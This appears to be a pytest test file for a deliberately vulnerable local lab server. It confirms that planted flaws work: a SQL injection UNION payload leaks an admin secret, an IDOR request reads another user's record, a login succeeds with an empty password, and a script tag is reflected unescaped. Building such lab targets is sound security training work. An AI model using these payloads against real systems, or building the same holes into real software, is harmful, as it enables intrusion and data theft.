from __future__ import annotations

import json
import urllib.request

import pytest

from lab.synthetic_target.server import serve


@pytest.fixture
def target():
    server, port = serve(port=0)
    yield port
    server.shutdown()


def _get(port: int, path: str) -> tuple[int, str]:
    req = urllib.request.Request(f"http://127.0.0.1:{port}{path}")
    with urllib.request.urlopen(req, timeout=2) as resp:
        return resp.status, resp.read().decode("utf-8")


def _post(port: int, path: str, payload: dict) -> tuple[int, str]:
    body = json.dumps(payload).encode()
    req = urllib.request.Request(
        f"http://127.0.0.1:{port}{path}",
        data=body,
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    with urllib.request.urlopen(req, timeout=2) as resp:
        return resp.status, resp.read().decode("utf-8")


def test_home_serves_html(target: int):
    code, body = _get(target, "/")
    assert code == 200
    assert "Synthetic Target" in body


def test_sqli_endpoint_is_actually_vulnerable(target: int):
    """Inject UNION to leak admin's secret column into the `name` field."""
    import urllib.parse
    payload = "%' UNION SELECT id, secret FROM users WHERE name='admin'--"
    code, body = _get(target, f"/api/users?name={urllib.parse.quote(payload)}")
    assert code == 200
    data = json.loads(body)
    # The admin's secret leaks through the union into the `name` slot.
    leaked = [u for u in data["users"] if "TOPSECRET" in (u.get("name") or "")]
    assert leaked, f"sqli should have leaked admin secret: {data}"


def test_idor_returns_other_users_secret(target: int):
    code, body = _get(target, "/api/profile?id=3")
    assert code == 200
    data = json.loads(body)
    assert data["name"] == "admin"
    assert "TOPSECRET" in data["secret"]


def test_broken_auth_login_succeeds_without_password(target: int):
    code, body = _post(target, "/api/login", {"username": "alice", "password": ""})
    assert code == 200
    data = json.loads(body)
    assert data["token"].startswith("session-")


def test_xss_endpoint_reflects_unescaped(target: int):
    payload = "<script>alert(1)</script>"
    import urllib.parse
    code, body = _get(target, f"/api/echo?text={urllib.parse.quote(payload)}")
    assert code == 200
    assert "<script>alert(1)</script>" in body  # unescaped reflection


def test_unknown_path_returns_404(target: int):
    try:
        _get(target, "/nonexistent")
        assert False, "should have raised"
    except urllib.error.HTTPError as e:
        assert e.code == 404
